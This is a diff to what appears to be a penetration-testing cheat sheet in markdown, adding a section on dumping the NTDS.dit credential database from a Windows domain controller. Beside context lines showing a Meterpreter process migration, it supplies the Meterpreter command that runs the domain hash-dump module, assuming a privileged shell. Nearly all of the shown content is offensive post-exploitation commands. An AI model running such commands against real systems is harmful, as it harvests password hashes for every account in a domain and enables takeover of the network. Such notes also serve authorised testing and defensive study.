@@ -54,4 +54,11 @@ meterpreter > migrate 812
 [*] Migration completed successfully.
 ```
 
+## Credential Access Dump NTDS.dit
+
+Assumes you have a priveleged shell on domain controller
+```
+meterpreter > run windows/gather/credentials/domain_hashdump
+```
+
 
